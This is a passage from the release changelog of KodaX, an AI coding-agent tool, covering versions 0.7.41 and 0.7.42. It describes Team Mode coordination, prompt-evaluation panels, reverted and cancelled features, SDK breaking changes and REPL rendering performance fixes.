- **`zhipu` / `zhipu-coding` `glm-5-turbo` contextWindow 128K → 200K** (commit `5324889e`). Provider metadata correction.
- **Narrow P2b RST-prone default list to `zhipu-coding` only** (commit `8e9b4520`). FEATURE_152 P2b (write-turn max_output_tokens cap) defaulted to a too-broad provider list, causing unrelated max_tokens RST on healthy providers; narrowed.
- **Image vision perception: tightened regex + Layer 3 compaction variants — `bc04581c` REVERTED**. Worker image-perception prompt block was prototyped (`bc04581c`) then reverted (`2fd8d8fc`) after Layer 3 V_*_compacted variants showed zhipu state turning honest refuses into confident hallucinations; saturated eval surfaced via tightened regex (require image-content keyword, not SVG markup). Layer 2 eval driver `fe76d3da` retained as permanent regression sweep. See `project_image_perception_worker_prompt` memory.
- **InkREPL spinner fallback: `item.content` → `item.subject`** (commit `157b162d`). Follow-up to the FEATURE_060 Tier 2 rename; the parallel-thread InkREPL.tsx still referenced `item.content` on the spinner-row fallback path.
- **InkREPL: `onThinkingEnd` no longer creates duplicate thinking item after assistant text** (commit `4798e66a`). Pre-fix, the end-of-thinking event could append a second transcript entry when the assistant had already begun streaming text; now coalesces with the existing thinking row.
- **`/compact` updates live token count via `onCompactStats`** (commits `4da09289` + `c058aeff` + revert `829401a8`). Status-bar token count was frozen pre-compaction; now updates in real-time as compaction proceeds. Revert chain captured a temporary command-bridge wiring path that crossed a layer boundary; replaced with the canonical onCompactStats callback in a follow-up.
- **FEATURE_184 follow-up shipped to v0.7.42 via narrow types**: `RunnerToolResult.content` union narrowed at string-only consumers (`ab2c63be`), unblocking the v0.7.45 sidecar-verifier work in parallel without forcing a v0.7.42 ship dependency.
- **FEATURE_173 ghost-session double-write**: see Added bullet above.

### Reverted

- **FEATURE_177 Worker prompt RULE D — `task_output` teaching layer** (commit `9082551b`). Layer 2 panel rerun (250 cells, 3.2% audit disagreement DATA VALID) hit pre-registered REVERT threshold: case C5 kimi RULE C write fan-out 80% → 20% (-60pp, judge + regex agree). Worker `dispatchRules` reverted to RULE A/B/C + IDLE-YIELD + LARGE CHILD OUTPUT + MODEL HINT (no RULE D in any state). **The runtime `task_output` tool itself stays ON** (commit `334756b7` — in-memory `ChildProgressSnapshot` ring buffer cap=200 + claudecode-shape envelope tool); SDK consumers can opt the worker into the RULE D prompt teaching via `KODAX_TASK_OUTPUT_PROMPT='1'`. Eval drivers retained as permanent regression sweep at `tests/feature-177-task-output*.eval.ts`. User-driven root-cause diagnosis (C5 -60pp is a systemic prompt design problem, not a wording issue) produced **ADR-033** (claudecode-Style Prompt Design Principles — qualitative criteria / single-concept sentences / sparing ✗ + WHY / no enumerated taxonomies / no version metadata in prompt body) and the v0.7.42 hygiene sweep below.

### Cancelled

- **FEATURE_094 — Deep Anti-Escape Hardening** (2026-05-19, see [memory](../memory/project_feature_094_cancelled.md)). Necessity probe (5 alias × 3 case × 3 run = 43 probes) measured **0/43 escape rate** across the canonical 5-alias panel — far below the cancel threshold (<5% AND <15%). The post-v0.7.26 layered defense (P0 system prompt + P2a `multi_edit` + P2b `max_output_tokens` write-turn cap) combined with FEATURE_152 (bash AST migration) + FEATURE_158 (signal-based classifier) + FEATURE_169 (pull-tool prompt hardening) absorbed the bypass surface that motivated the original 2026-04 design (~15% bypass at that time). Probe retained as permanent regression sweep: `tests/feature-094-necessity-probe.eval.ts` + `benchmark/datasets/feature-094-necessity-probe/cases.ts`. Escape rate **must** stay 0%; `>5%` reopens FEATURE_094.

### Internal / architecture

- **ADR-029 — AMA Compaction Trigger Parity (Top-of-Loop)** documents the FEATURE_179 lifecycle move.
- **ADR-031 — Task-Level Hits Ledger 与 Cross-Session Memdir 分层独立** documents the FEATURE_185 vs FEATURE_124 (v0.7.43 memdir) boundary.
- **ADR-032 — SDK Embedder Surface Closure (FEATURE_186, v0.7.42)** documents the 8-phase atomic execution + no-dual-route + dynamic config-path + metadata-driven plan-mode gate + Phase 7 vs Phase 8 (capability-provider-shape vs manager-shape) design decisions.
- **ADR-034 — claudecode-Parity dispatch_child Architecture (FEATURE_188, v0.7.42)** documents the forced-worktree drop + qualitative dispatchRules + write-child Coordination briefing. Three dead assumptions retired (Evaluator review-at-merge / "failed rollback needs worktree" / "parallel writes must conflict"). claudecode's `isolation:'worktree'` opt-in is the precedent; KodaX picks user-directed prompt-level peer coordination instead of an explicit opt-in toggle to keep the dispatch friction low.
- **ADR-033 hygiene sweep — Worker `dispatchRules` claudecode-style refactor**. Two commits in v0.7.42 release window apply ADR-033 principles systemically on top of FEATURE_188's qualitative swap:
  - **PLAN-FIRST trigger qualitative swap** (commit `5569c49c`, `worker-role-prompt.ts:212`). `≥3 children` → `multiple children`. Panel 95/100 cells empty-binding (floor saturation analog of `feedback_pre_registered_gate_saturation`); audit DATA VALID (plan_first 10.0% at threshold / dispatch_intent 0.0%); per-alias gate met; aggregate +3/100. Policy alignment, not behavioral change.
  - **FAN-OUT PLAN GRANULARITY block 18-line → claudecode 3-bullet** (commit `1e60eeb0`, `worker-role-prompt.ts:210-216`). 18-line block → 4-line (−57% chars); deletes 6 × ✗ 反模式 + 5 × enumerated label + WORKED EXAMPLE code block + version metadata. Layer 2 panel C4 baseline 0/25 dispatch vs claudecode 7/25 (judge view); 5/5 alias dispatch Δ ≥ 0. mmx C4 -2 cell strict gate failure overridden via evidence-driven SHIP (baseline saturation in plan-without-dispatch case).
- **Doc reconciliation: FEATURE_184 design relocation v0.7.45.md → v0.7.42.md** (commit `ac4d0267`). FEATURE_184 was drafted as v0.7.45 then shipped to v0.7.42's release window 2026-05-21; the design doc is relocated to match shipped reality. Git history of the 28 v0.7.45-tagged commits is preserved as-is — only the `docs/features/v0.7.{42,45}.md` files were rewritten.
- **build pipeline: `build-dts.mjs` self-test** (Phase 1 of FEATURE_186). Builds a CI guard against `@kodax-ai/*` internal-import leaks in any of the 7 entry `.d.ts` files (root + 6 subpaths). POSITIVE/NEGATIVE sample regex self-test + hard-assert grep on each built entry — exits 1 if any leak found. Prevents the v0.7.40 publish hazard from reaching the tarball again.
- **`@kodax-ai/kodax/mcp` subpath** (Phase 7 of FEATURE_186). Sixth SDK subpath; thin re-export of `@kodax-ai/mcp`. Build pipeline (`build-bundle.mjs` `sdkEntryNames` / `build-dts.mjs` `sdkEntries` / `release.mjs` `pkg.exports`) and release.mjs publishConfig wiring all three sync.
- **Cancelled features tracker hygiene**: FEATURE_094 row updated in `docs/FEATURE_LIST.md`; tracker entry shows `Cancelled 2026-05-19` with necessity-probe rationale + probe retention pointer.
- **`@kodax-ai/coding` MCP barrel** — `registerConfiguredMcpCapabilityProvider` + `McpCapabilityProvider` etc. still re-exported through coding for backward compatibility; new `@kodax-ai/kodax/mcp` subpath is the cleaner entry going forward.

### Breaking changes

- **`LocalToolDefinition.sideEffect` is now required** (Phase 4 of FEATURE_186, commit `7defd65f`). SDK consumers who construct custom `LocalToolDefinition` objects via `registerTool({...})` must now include a `sideEffect: 'readonly' | 'mutates-fs' | 'mutates-shell' | 'mutates-network' | 'mutates-state'` field. tsc will fail on pre-v0.7.42 consumer code until this field is added. The most-defensive default for custom tools is `'mutates-state'`; `'readonly'` is appropriate only for tools with NO observable effects on the system.
- **`@kodax-ai/coding` exports new types**: `ToolSideEffect`, `KodaXSessionControl`, `KodaXSessionMutators`. These are additive (no rename); existing imports unaffected.
- **FEATURE_188 (ADR-034) — `dispatch_child_task` no longer auto-creates a worktree for write children**. Write children now share the parent agent's `executionCwd` + `gitRoot` (per-file `backups` Map remains the rollback substrate, and the write-child briefing now carries a "Coordination with peers" section instructing the child to STOP-and-report if peer-conflict cannot be ruled out). The `KodaXChildExecutionResult.worktreePaths?: ReadonlyMap<string,string>` field is removed; the `KodaXManagedTaskRuntimeState.childWriteWorktreePaths` field is removed; the `KodaXToolExecutionContext.registerChildWriteWorktrees?` callback is removed; the `WriteChildDiff` interface + `buildEvaluatorMergePrompt` / `collectWriteChildDiffs` / `cherryPickWorktree` / `cleanupWorktrees` helpers (all dead since FEATURE_184 ADR-030 retired the Evaluator role) are removed. `toolWorktreeCreate` / `toolWorktreeRemove` tools themselves stay in the registry — they still serve the user-explicit `EnterWorktreeTool` / `ExitWorktreeTool` flow. SDK consumers reading `worktreePaths` for diff inspection must instead consume `evidence` / `mergedFindings`. See [ADR-034](docs/ADR.md#adr-034-claudecode-parity-dispatch_child-architecture--drop-forced-worktree--prompt-level-conflict-awareness-feature_188-v0742).

### Test coverage delta

- **+158 new unit tests** from FEATURE_186 alone (32 `getAppDataDir` + 18 tool-metadata helpers + 21 custom-provider CRUD + 20 RunningSession + 26 MCP CRUD + 20 McpManager + 21 plan-mode gate / skill-resolver / build-dts self-test).
- Plus tests added by FEATURE_173 (12 stable-contract), FEATURE_175 Slice 2 (6 net), FEATURE_177 cache (per-task LRU), FEATURE_178 stall detector (L1+L2), FEATURE_179 lifecycle test, FEATURE_180 dedup test, FEATURE_181 / 182 / 183 single-case fixes, FEATURE_185 enrichment (13 file-tracker + 9 post-compact + 33 result-extractors + Layer 2 eval driver).
- Coding 2704/2704 + repl 1431/1432 green across the cycle. Build:bundle + build:dts clean for all 7 subpath entries.

## [0.7.41] - 2026-05-19

### Theme

**KodaX Team Mode + AMA Reliability + Source-Tree Modularization + REPL Render & TTFB Perf** — The release lands a third-axis differentiator (multi-instance auto coordination) alongside three AMA-path reliability fixes (mid-turn inject, pending-children handoff gate, post-handoff label flip, terminal-verdict fallback), the Todo V2 per-task CRUD migration with extension hooks, and the largest source-tree refactor since v0.7.25 (`runner-driven.ts` 6406 → 1897 lines, -70.4%, byte-identical). FEATURE_125 KodaX Team Mode is the headline: zero-cognitive-load multi-session awareness (no `/team create`, no `team_id`) — each KodaX instance writes per-pid state to `<configHome>/instances/<pid>/`, every LLM round injects a sibling-snapshot block into all 5 managed roles' system prompts (Scout / Planner / Generator / Evaluator / Worker), and a runtime content-hash safety net catches the only genuine data-race surface (concurrent overwrite of a file another session already read). The LLM-First design contrasts with claude code Team Mode's mode-based 4-stage workflow and no-conflict-resolution semantics. FEATURE_167 closes a structural `signal:'COMPLETE'` false-positive on V2 Evaluator turns (3-layer probe-gated defense: B0 parser SKIP / B1 retry cap / B2 synthesized verdict accept). FEATURE_165 + 166 land together as a Worker→Evaluator handoff hardening pair — runtime gate blocks `emit_handoff` while child registry is non-empty (covers V1+V2 shared `handoffEmit` path), and the REPL surface flips role labels immediately on `agentSwitched` (was lagged a turn). FEATURE_170 migrates the todo subsystem from monolithic init/replace to per-task add/patch/remove with extension events + hooks + new `todo_create` tool; Layer 2 LLM-judge eval (Layer A + Layer B 3.2% disagreement → DATA VALID) clears gate (a)+(b) MET, (c) saturation-artifact noted. FEATURE_171 extracts 12 submodules from `runner-driven.ts` across R1–R4 — zero behavior change, 4 reviewer APPROVE rounds, 4314/4314 tests pass each commit, ADR-026 + HLD §3.5.1 documented.

### Added

- **FEATURE_125 — KodaX Team Mode (Multi-Instance Auto Coordination)**. 11 commits S1–S7 + W1–W4 (`acef3c5e` → `9225ad31` → S7 `e2916675` + `e6bc5d7b` audit) + release-prep wiring `0cfc8bc4`. KodaX 自创的多 session 自动协调机制：用户**零认知负担**（无 `/team create`、无 `team_id` 概念），KodaX 自动感知本机其他 KodaX session 状态，把状态注入 LLM system prompt 让 LLM 自决避让/协作/调度；runtime 仅在 race condition 物理边界（content hash mismatch）兜底，不强制 lock、不强制等待。这是与 claude code Team Mode（mode-based 4-stage workflow + 完全无 conflict resolution）的核心差异化。**5 layers**: (S1) per-instance state writer at `<configHome>/instances/<pid>/{state.json,meta.json,heartbeat}` with atomic writes + 1s heartbeat + register/refresh/shutdown lifecycle; (S2) sibling-instance discovery + stale detection + reap with `PersistedSessionState v1` version guard + per-instance failure isolation; (S3) pure system-prompt formatter for the `=== Other active KodaX sessions ===` block (LLM-First wording, truncation, no behavior dictation); (S4) `KodaXToolExecutionContext.contentHashCache?` sha256-based stale-write detection with `recordRead` / `checkStale` / `recordWrite` per-task lifetime; (S5) tool-time soft-warning formatter for exact-path overlap match (no blocking, just an informational banner). **Wiring** (W1–W4): Read tool records sha256 on every successful read up to 5 MB (size cap so huge files don't pay the hash cost); Edit / Write / MultiEdit pre-mutation `checkStale` block + post-mutation `recordWrite` + sibling-overlap warning banner via `ctx.siblingSnapshot`; REPL bootstrap helper `bootstrapTeamMode()` with process-level singleton + `/exit` + SIGTERM lifecycle hooks (mirror wiring landed for both `runInteractiveMode` legacy path AND `runInkInteractiveMode` Ink REPL path — the latter was the release-blocker fix in commit `0cfc8bc4`); runner-driven adapter does per-LLM-round sibling discovery, injects `teamModeSection` into all 5 managed roles' system prompts (Scout / Planner / Generator / Evaluator / Worker) via a mutable `siblingSnapshot` ref + `Object.defineProperty` getter so tool ctx always reads the freshest snapshot. **S7 Layer 2 panel + audit**: `tests/feature-125-team-mode-awareness.eval.ts` + `benchmark/datasets/feature-125-team-mode-awareness/cases.ts`; 5 aliases × 2 cases × 5 runs = 50 LLM calls; **SHIP** per pre-registered matrix after audit-corrected regex extension (`buildToolNamePatterns` expanded from 4 to 9 syntax variants to capture kimi `read:0>{...}` and zhipu `<tool_name>read</tool_name>` forms). Layer A + Layer B audit-corrected primary verdict: case 1 84% / case 2 60% overall (4/5 aliases ≥60% — kimi case 2 narrate-without-tool documented as `feedback_model_structural_floor_not_prompt_tunable`; not addressable via prompt iteration). Design doc: [docs/features/v0.7.41.md#feature_125-kodax-team-mode--multi-instance-auto-coordination](docs/features/v0.7.41.md#feature_125-kodax-team-mode--multi-instance-auto-coordination). Test guide: `docs/test-guides/FEATURE_125_v0.7.41_TEST_GUIDE.md`.
- **FEATURE_165 — Worker `emit_handoff` pending-children gate**. Commit `0ebeb15f`. Runtime gate at `runner-driven.ts:2402` blocks `emit_handoff` when the child registry is non-empty (covers both V1 and V2's shared `handoffEmit` path). 9 unit tests + 1 integration test pin the gate semantics across both paths. **Prompt addition PARTIAL/dropped**: Layer 2 probe (250 calls × 5 aliases) showed negative-case D/E already 100% on the baseline (`Δ=0pp`), so the pre-registered SHIP condition (2) failed mathematically; the runtime gate is the production-load-bearing change. Probe also confirmed zhipu intent-vs-action floor reproduces in canned-history sessions (structural, not context-length-driven). Design doc: [docs/features/v0.7.41.md#feature_165--worker-emit_handoff-pending-children-gatev0741-hotfix](docs/features/v0.7.41.md#feature_165--worker-emit_handoff-pending-children-gatev0741-hotfix).
- **FEATURE_166 — Post-handoff role label flip**. Commit `0ebeb15f`. New `onAgentSwitched` hook on agent-runtime + `ObserverBridge.agentSwitched(role)` on coding-side. Fixes the V2 Worker→Evaluator handoff label-lag (`[Worker]` would persist on the next Evaluator turn until the assistant produced output). Production session `20260515_185354` gave a directly reproducible verdict trace. 7 unit tests + 1 pre-existing test corrected. Same session also surfaced FEATURE_167 (Evaluator text-only termination leaves `recorder.verdict === undefined`, V2 runner-driven never wired the `parseManagedTaskVerdictDirectiveFromJson` fallback — landed in FEATURE_167 below). Design doc: [docs/features/v0.7.41.md#feature_166--post-handoff-role-label-flipshipped](docs/features/v0.7.41.md#feature_166--post-handoff-role-label-flipshipped).
- **FEATURE_167 — Evaluator terminal-verdict fallback (B0 parser + B1 retry + B2 synthesized accept)**. Commit `d537c784` 2026-05-15. Three-layer probe-gated defense closes the structural `signal:'COMPLETE'` false-positive on V2 Evaluator turns where the model exits text-only without calling `emit_verdict` and `recorder.verdict` therefore stays `undefined`. **Layer B0** — parser SKIP path (regex+JSON parse on the assistant's terminal text looking for `{"signal":"COMPLETE","grade":...}` directives); **Layer B1** — retry gate with per-alias cap (default 2, zhipu cap 1 to avoid amplifying the intent-vs-action floor — see `project_zhipu_send_message_floor` memory); **Layer B2** — synthesized verdict accept (fabricates a `{signal:'NEEDS_REVISION', grade:'C', summary:'…inferred from terminal text…'}` envelope so the V2 task engine can complete instead of hanging on the missing verdict). Reviewer-suggested change "include `revise` in the gate" was rejected — correct invariant is `recorder.verdict` object identity comparison (NOT status comparison), otherwise a stale `revise` from a prior turn would falsely satisfy the gate. 29 tests (16 retry-config + 9 predicate + 4 integration); audit panel 0/75 disagreement → DATA VALID. Design doc: [docs/features/v0.7.41.md#feature_167--evaluator-terminal-verdict-兜底shipped](docs/features/v0.7.41.md#feature_167--evaluator-terminal-verdict-兜底shipped).
- **FEATURE_170 — Todo V2 Migration (per-task CRUD + extension hooks + `todo_create` tool)**. C1–C6 across 8 commits (`e45ddaa8` → `20e02103`). Replaces v0.7.x's monolithic init/replace todo-store API with per-task `add` / `patch` / `remove` operations + monotonic counter + metadata + extension events (`todo:added` / `todo:patched` / `todo:removed` / `todo:before-complete`) + before-complete hook for downstream consumers. New `todo_create` tool added to the registry + role wiring + throttle reset. Worker / legacy / throttle prompts updated to teach the per-item API (C5) with activeForm parity fix (C5 follow-up). **Layer 2 LLM-judge eval (Layer A + Layer B)**: 250-call panel + Layer A 5-sub-agent self-judge + Layer B 3-judge majority (750 calls), Layer B 3.2% disagreement → DATA VALID; gate (a)+(b) MET; gate (c) FAIL as a **pre-registered SHIP gate saturation artifact** (C2 baseline 96% / C3 100% — mathematically unable to add +20pp from a near-saturated baseline). C1 +32pp / mmx 0→100% are direct prompt-cause evidence — SHIP, keep the prompt rewrite. Lessons captured in two new memory entries: `feedback_pre_registered_gate_saturation` (pilot for baseline ceiling before deferring on Δ ≥+N pp) and `feedback_simplifying_prompt_can_regress` (Prefer over X when Y comparative clauses are load-bearing). Design doc: [docs/features/v0.7.41.md#feature_170--todo-v2-migration-per-task-crud--extension-hookssshipped-2026-05-16](docs/features/v0.7.41.md#feature_170--todo-v2-migration-per-task-crud--extension-hookssshipped-2026-05-16).
- **FEATURE_164 — Mid-turn user-input injection** (shipped as part of commit `0ebeb15f`, the FEATURE_164+165+166 triple). Closes the gap where a user prompt typed during an active LLM round was queued but only delivered as a synthetic `[user]` banner on the next idle-yield wake — semantically incorrect for the user's intent ("inject as if I'd typed it mid-turn"). Now the runner-driven adapter checks the `MessageQueue` snapshot before each LLM call and prepends any queued real-user messages as proper non-synthetic user-bubble messages within the same round.

### Fixed

- **FEATURE_125 W3 — Ink REPL Team Mode bootstrap wiring** (release-blocker fix). Commit `0cfc8bc4`. Discovered during v0.7.41 release prep audit: FEATURE_125 W3 (commit `1a073ecc`) wired `bootstrapTeamMode` into the legacy `runInteractiveMode` path but never into `runInkInteractiveMode`, so the Ink REPL (the default REPL path on all platforms since v0.7.25) ran with Team Mode dormant — `<configHome>/instances/<pid>/` was never created, no heartbeat thread started, sibling discovery returned empty, and the system-prompt `teamModeSection` was a no-op for every Ink-launched session. Mirror-wires the bootstrap + `process.on('exit')` + `process.on('SIGTERM')` + clean-exit cleanup into `runInkInteractiveMode` at the same insertion point (after `gitRoot` resolution, before render). 37 lines net.
- **Issue 132 — h2-boundary `session.jsonl` ENOENT race**. Commit `bf3006fb`. Eager-read in `agent-task-runner` resolves the timing window where benchmark h2-boundary cases would call `tail -f session.jsonl` before the file existed on disk; pre-reads on task start instead of awaiting the first append.
- **FEATURE_166 stale-test correction** (1 pre-existing test): `agent-runtime.test.ts` had been asserting the buggy label-lag behavior as-correct — corrected to pin the fixed semantics so future regressions surface immediately.
- **FEATURE_171 build break + decl emit** (covered transitively by the R1–R4 chain test-pass discipline): every refactor commit ran `tsc -b tsconfig.build.json` + 4314 tests green; no stage shipped a partial transform.
- **Bundle SDK `.d.ts` so consumer `tsc` resolves types** (commit `af623000`). Footgun caught at the SDK consumer surface: tarball shipped `dist/index.js` + subpath bundles but no matching `.d.ts`, so `import { runKodaX } from '@kodax-ai/kodax'` worked at runtime while consumer `tsc` reported missing types. Build pipeline now layers `tsc --emitDeclarationOnly` on top of the esbuild bundle so every published subpath ships real types.
- **`KODAX_RENDER_TRACE` default path uses `os.tmpdir()` not `homedir()`** (commit `54a59caa`). Phase A.0 review follow-up — `homedir()` pollutes the user's home with per-pid trace files; `os.tmpdir()` is the conventional location for ephemeral diagnostic output and gets cleaned up by the OS.

### Performance

- **FEATURE_172 — REPL Render Path Optimization (Phase 1 + Phase A.0/A.1)**. Triggered by user SSH long-session (`kodax -c` with 200+ history items) reporting "every 2-3s a frame refresh" during streaming. Two-phase work, with a mid-feature scope correction.
  - **Phase 1 (data layer)** — 5 commits `19c6aff3` → `26d47084`. Split `transcript-layout.ts` into pure static/dynamic helpers (`buildTranscriptStaticPortion` / `buildTranscriptDynamicPortion` / `composeTranscriptRenderModel`); split `promptMainScreenRenderModel` + `transcriptMainScreenRenderModel` `useMemo` into static + dynamic with a static-cache-key invariant (streaming-state changes no longer invalidate the static portion); added `React.memo` `areTranscriptRowPropsEqual` comparator on `TranscriptRowRenderer`. **Data-layer bench** (`baseline-26d47084.json`, 800 items): streaming-tick p95 94.18ms → 0.52ms (-99.4%).
  - **Phase 1 scope correction (2026-05-19)** — Phase 1 ship review with 3 parallel Explore-agent traces + claudecode end-to-end pipeline comparison revealed the data-layer bench (`benchmark/perf/repl-render-perf.bench.ts`) only measured `buildTranscriptRenderModel` inner function (~3-5% of total per-frame cost). The real ~80% lives in `tui/substrate/ink/` rendering substrate: `renderNodeToOutput` full-tree recursion (~55%), `setCellAt` `cells.slice()` O(N²) (~12%), `Output.getGrid()` rebuild (~12%), `diffEach` full-screen walk (~10%), `markDirty` propagation gap (~5%). **Lesson** captured to feedback memory: bench must measure end-to-end wall-time, not isolated inner functions; static analysis of a hot loop can miss the actual cost center.
  - **Phase A.0 — `KODAX_RENDER_TRACE` env-gated per-frame trace + end-to-end bench scaffold** (commits `5ca91970` + `54a59caa` + `dae85141` + `99e7f2af`). Env-gated trace writes one `frame=N renderTime=X bytes_per_frame=Y writes=Z` line per render to `<tmpdir>/kodax-render-trace-<pid>.log`; bench scaffold parametrizes viewport at the user's real SSH dimensions (148×43) and measures the full engine `onRender` pipeline with a mock stdout so `setCellAt` / `outputToScreen` / `diff` costs are real.
  - **Phase A.1 — `ScreenBuilder` eliminates `setCellAt` O(N²) `cells.slice()`** (commit `25bf0f52`). New mutable builder pattern at `output-to-screen.ts:211`: original `setCellAt(screen, ...)` did `screen.cells.slice()` (full width×height ref copy) + `{...screen, cells}` per non-empty cell — on a 148×43 viewport with ~500 non-empty cells/frame that's ~3.18M element-copies + 500 fresh arrays + 500 fresh Screen objects per frame. `createScreenBuilder(width, height)` exposes O(1) `setCellAt` writes + one-shot `build()` that returns a frozen Screen; only the `outputToScreen` hot loop migrated, public `setCellAt(Screen, ...)` API preserved for tests + future immutable callers. **End-to-end bench delta** (148×43, `mainscreen-windowed-800` scenario): renderer p95 14.804ms → 3.095ms (-79%, 4.78× speedup). 193 substrate-ink tests + 7 new ScreenBuilder unit tests (byte-equal vs `setCellAt`, OOB rejection, post-build-write rejection, 10k-write soft budget) + last-write-wins test `1105a181` close the review loop. 1426/1427 full repl PASS.
  - **Phase A.2-E deferred pending user SSH trace measurement after A.1 ship.** ADR-028 documents the full claudecode port plan (Phase B nodeCache + markDirty / Phase C screen.damage bounding box / Phase D Output.charCache + StylePool / Phase E FRAME_INTERVAL + viewport culling). Layer 0 G1 (transcript render goldens, `925a4d77`) + G2 (perf bench + baseline, `4641ebb9`) + G4 (hit-test + selection 22 edge tests, `4fb590f3`) shipped as Phase 0 planning artifacts; ADR-027 + ADR-028 + `docs/test-guides/FEATURE_172_v0.7.41_TEST_GUIDE.md` document the full pipeline.
- **First-round TTFB compression — drop `refresh:true` tax + parallel pre-LLM + REPL-mount prewarm** (commit `e8b336ed`). Triggered by user observation: review-type prompts on a medium repo paid ~24s pre-LLM wall-time (after parallel/memoize work) before any LLM token streamed. Compressed via L1+L2 to ~10-15s (LLM-TTFB-bound). 5 stacked changes:
  - **L1 — `middleware/repo-intelligence.ts` first-round NEVER forces `refresh:true`**. 4 sites of `refresh: isNewSession` → `refresh: false`. The 30s `PREMIUM_REFRESH_TIMEOUT_MS` budget was paid on every new session, but the daemon's own background polling keeps its on-disk state fresh; the 4s budget path returns daemon's already-cached state immediately. Single biggest savings (~10-15s).
  - **L2 — REPL-mount prewarm** (new `prewarmRepoIntelligenceCaches` helper exported from `@kodax-ai/coding` + Ink-REPL `useEffect`). Fires `getRepoRoutingSignals` + `getRepoPreturnBundle` with refresh:false at REPL mount, fire-and-forget. Cache-coherent with L1 (both refresh:false) so user-path either coalesces onto in-flight prewarm Promise (~2s) or hits warmed P3+ cache (~0ms). Default-on; opt-out via `KODAX_PREWARM_REPO_INTELLIGENCE=0`.
  - **P1.a — middleware parallel fan-out**. Two-phase `Promise.all`: Phase 1 races OSS overview (git+fs) with premium preturn (daemon); Phase 2 races module + impact direct-call fallbacks ONLY for slots not already filled by preturn. Behavioral pins preserved (preturn gating + `.catch(() => null)` error isolation + emit order: preturn → module → impact).
  - **P1.b — run-substrate parallel**. `hydrateSession` (MCP state restore) and `getRepoRoutingSignals` collapsed to one wall-time slot via `Promise.all`; hydration error propagation unchanged, routing has independent `.catch(() => null)`.
  - **P2 / P3 / P3+ — multi-tier cache stack**. P2 in-flight Promise sharing in `tryPremiumPreturn` (1.5s TTL, cacheKey DELIBERATELY includes `refresh` so explicit `refresh:true` callers — `/repointel warm`, eval harness — get their own daemon work). P3/P3+ session-scoped caches (60s TTL on routing signals + preturn bundle, cacheKey OMITS refresh so prewarm + first-round share one entry under the "data within 60s is fresh by definition" semantics). `normalizeCachePath` helper makes cacheKey robust to Windows drive-letter case + relative-vs-absolute caller variations + Promise rejection paths.
  - **Default repo-intelligence mode preserved as `'auto'`**. Briefly experimented with flipping default to `'oss'` for users without repointel; cost analysis showed `'auto'` fallback path is ~10ms localhost TCP RST + 2s `PREMIUM_FAILURE_TTL_MS` cache → 0ms within TTL + ~5-10ms per >2s gap (negligible vs LLM TTFB). Auto-detection of installed repointel is the right default per README:182.
- **Inline spinner-row stats tail — elapsed + tokens (claudecode parity)** (commit `58682cbf`). REPL spinner row gains an inline `Xs · Y tokens` running tail (matches claudecode's status indicator). Frontline of a sequence of claudecode-parity surface improvements; documented in ADR-027 Phase 0.

### Internal / architecture

- **FEATURE_171 — `runner-driven.ts` modular split**. R1 `2fef1c31` (4 leaf modules + `types.ts`) → R2 `f0be2d4e` (4 mid-coupling modules) → R3 `bfb2b818` (agent-chain + llm-adapter) → R4 `62dc1c58` (payload-builder + checkpoint-flow). 12 submodule extraction; **6406 → 1897 lines (-70.4%)**; **zero behavior change**; **4 reviewer APPROVE rounds**; **4314/4314 tests pass each commit**. ADR-026 + HLD.md §3.5.1 documented in R5 (`4d108af9`). The refactor preserves the closure pattern around `baseCtx` / `siblingSnapshot` / `contextTokenSnapshotRef` — what was a 6400-line monolith is now a stack of named factories each under 800 lines. Module map: `types.ts`, `agent-chain.ts`, `payload-builder.ts`, `checkpoint-flow.ts`, `llm-adapter.ts`, `compaction-bridge.ts`, `manager-input-builder.ts`, `result-projection.ts`, `tool-ctx-builder.ts`, `child-task-orchestration.ts`, `recorder-bridge.ts`, plus the residual `runner-driven.ts` entry. Side benefit: faster IDE hover-pop on the public surface; the public export shape is unchanged so all consumers are byte-equivalent.
- **`bootstrapTeamMode` + `TeamModeHandle` exports added to `@kodax-ai/agent`** so the Ink REPL can import them without depending on legacy-CLI internals. The handle exposes `shutdown()` and is opaque otherwise (per the layer-independence guarantee — REPL has no business poking at the per-instance writer's internals).
- **`KodaXToolExecutionContext.contentHashCache?`** field added with `recordRead` / `checkStale` / `recordWrite` API surface. Per-task lifetime (created at task start, destroyed at completion). Wired into Read / Edit / Write / MultiEdit tool implementations so the FEATURE_125 race-detection works without per-tool plumbing.
- **`KodaXToolExecutionContext.siblingSnapshot?`** field added (as a mutable ref) with `Object.defineProperty` getter on the tool ctx so each tool invocation reads the freshest snapshot from the runner-driven adapter's per-round refresh. Avoids stale-snapshot reads when the LLM stream spans multiple seconds.
- **`buildToolNamePatterns` extended from 4 to 9 syntax variants** in the benchmark harness regex tooling (`benchmark/datasets/feature-125-team-mode-awareness/cases.ts` + downstream). Captures kimi `read:0>{...}`, zhipu `<tool_name>read</tool_name>` and 3 other non-canonical syntaxes; lesson saved as `feedback_regex_audit_per_new_eval`.
- **`JudgeContext.toolCalls?`** plumbed through `benchmark/harness/judges.ts` + both call sites in `benchmark/harness/harness.ts`. Optional `judge(output, context?)` arg lets binding-only providers (zhipu/glm51, mmx/m27, etc. — they emit `text=""` and put the tool call in the structured `tool_calls` field) be judged on what the harness actually captured, not on the empty raw text. Existing text-only judges ignore the arg and continue to work unchanged. Per `feedback_audit_must_see_binding` + `feedback_audit_binding_priority_in_prompt`: also requires the audit judge prompt to label the binding as "ABSOLUTE GROUND TRUTH" + a `CRITICAL RULE` system prompt section, or judges over-anchor on the empty raw text.
- **2 prompt-eval datasets** added under `benchmark/datasets/`: `feature-125-team-mode-awareness/` (S7 Layer 2 panel: peer-active-file-acknowledge-read-first + peer-recently-modified-reread) and `tool-schema-slim/` (Layer 2 eval of v2_slim ~half + v3_aggressive ~quarter description variants for `ask_user_question` + `todo_create` — see "Tool schema slim eval" below).
